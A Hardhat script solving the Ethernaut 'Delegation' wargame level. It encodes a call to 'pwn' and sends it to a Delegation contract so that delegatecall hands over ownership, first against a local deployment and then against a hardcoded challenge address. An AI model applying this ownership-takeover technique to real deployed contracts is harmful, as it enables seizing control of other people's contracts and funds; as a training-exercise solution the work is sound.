import { ethers } from "hardhat";

// Run on localhost
async function handleTest() {
  const [me, deployer] = await ethers.getSigners();

  const delegateFactory = await ethers.getContractFactory("Delegate");
  const delegate = await delegateFactory
    .connect(deployer)
    .deploy(deployer.address);

  const delegationFactory = await ethers.getContractFactory("Delegation");
  const delegation = await delegationFactory
    .connect(deployer)
    .deploy(await delegate.getAddress());

  const jsonAbi =
    require("../../artifacts/contracts/ethernaut/Delegate.sol/Delegate.json").abi;

  const iface = new ethers.Interface(jsonAbi);

  const encodedData = iface.encodeFunctionData("pwn");

  await me.sendTransaction({
    to: await delegation.getAddress(),
    data: encodedData,
  });
}

async function handleReal() {
  const [me] = await ethers.getSigners();

  const jsonAbi =
    require("../../artifacts/contracts/ethernaut/Delegate.sol/Delegate.json").abi;

  const iface = new ethers.Interface(jsonAbi);

  const encodedData = iface.encodeFunctionData("pwn");

  await me.sendTransaction({
    to: "0x271cd08b996C40A96b02ceF788E1479ef2850a1D",
    data: encodedData,
    // Raised gasLimit for the transaction to go through in the second contract, I think
    gasLimit: 100000,
  });
}

// handleTest().catch((error) => {
handleReal().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
